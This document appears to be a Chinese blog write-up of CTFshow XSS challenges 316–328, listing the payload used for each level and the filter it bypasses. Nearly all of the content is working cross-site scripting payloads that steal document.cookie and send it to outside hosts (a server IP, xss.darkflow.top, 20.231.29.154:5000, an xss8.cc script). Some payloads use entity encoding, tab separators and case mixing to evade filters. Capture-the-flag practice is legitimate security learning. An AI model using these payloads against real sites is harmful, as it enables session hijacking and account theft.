---
title: CTFshowXSS
abbrlink: 36544
date: 2022-04-06 22:22:50
tags:
---

首先自己搭建或者找[xss测试平台](https://xss8.cc/login/)还有[另一个](https://xss.pt/)

**316**

```
最简单的：
<script>document.location.href='http://服务器IP/?x='document.cookie</script>
```

**317**

过滤了script

```
<body onload="document.location.href='http://服务器IP/?x='+document.cookie"></body>
```

**318**

过滤了img，使用iframe

```
<iframe WIDTH=0 HEIGHT=0 srcdoc=。。。。。。。。。。&#60;&#115;&#67;&#82;&#105;&#80;&#116;&#32;&#115;&#82;&#67;&#61;&#34;&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#48;&#120;&#46;&#97;&#120;&#47;&#107;&#48;&#74;&#106;&#34;&#62;&#60;&#47;&#115;&#67;&#114;&#73;&#112;&#84;&#62;>
<BODY	ONLOAD=document.location='http://xss.darkflow.top?cookie='+document.cookie;>
```

**319**

同上即可

**320**

过滤了空格，script，用tab

```
<iframe	WIDTH=0	HEIGHT=0	srcdoc=。。。。。。。。。。&#60;&#115;&#67;&#82;&#105;&#80;&#116;&#32;&#115;&#82;&#67;&#61;&#34;&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#48;&#120;&#46;&#97;&#120;&#47;&#107;&#48;&#74;&#106;&#34;&#62;&#60;&#47;&#115;&#67;&#114;&#73;&#112;&#84;&#62;>
```

**321**

过滤了img，同上

**322**

同上

**323**

过滤了iframe，使用body onload（艹居然过滤了xss，我的域名里有xss啊啊啊啊啊啊啊啊啊啊啊）

```
<body/onload=document.location='http://20.231.29.154:5000/?cookie='+document.cookie;>
```

一直到326通杀

浅总结：看这几道题来说，反射性xss无非就是变换标签，结合各种编码去绕过，空格用`\`，关键字双写或者编码等等



存储型XSS开始

**327**

收件人为admin，内容为XSS即可

```
<body/onload=document.location='http://20.231.29.154:5000/?cookie='+document.cookie;>
```

**328**

构造js偷管理员cookie（不知道为啥我偷了登陆了也不行）

![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-20 17.41.19.png)

用超强模块吧

```
<sCRiPt sRC=//xss8.cc/R9YM></sCrIpT>
```
